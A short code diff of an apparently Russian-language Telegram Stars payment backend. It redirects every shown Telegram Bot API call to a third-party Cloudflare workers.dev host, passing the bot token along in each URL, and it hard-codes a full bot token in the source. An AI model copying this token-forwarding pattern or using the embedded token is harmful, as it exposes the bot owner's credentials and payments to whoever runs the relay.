@@ -204,7 +204,7 @@ def send_telegram_notification(message: str):
         print(f"[TG] Not configured, skipping notification. Message: {message}")
         return False
     try:
-        url = f"https://api.telegram.org/bot{TG_BOT_TOKEN}/sendMessage"
+        url = f"https://stars.gleb0256149.workers.dev/bot{TG_BOT_TOKEN}/sendMessage"
         payload = {
             "chat_id": TG_ADMIN_CHAT_ID,
             "text": message,
@@ -950,7 +950,7 @@ def create_invoice():
 
     try:
         bot_token = "8837626872:AAEEqnmT-hEKwMOhTfZ9LDLmOu7AHi88Pzw"
-        url = f"https://api.telegram.org/bot{bot_token}/createInvoiceLink"
+        url = f"https://stars.gleb0256149.workers.dev/bot{bot_token}/createInvoiceLink"
         payload = {
             "title": "Пополнение баланса",
             "description": f"Покупка {amount} Stars",
@@ -1019,7 +1019,7 @@ def withdraw_nft():
 
     try:
         bot_token = "8837626872:AAEEqnmT-hEKwMOhTfZ9LDLmOu7AHi88Pzw"
-        url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
+        url = f"https://stars.gleb0256149.workers.dev/bot{bot_token}/sendMessage"
         payload = {
             "chat_id": 6267608438,
             "text": text,
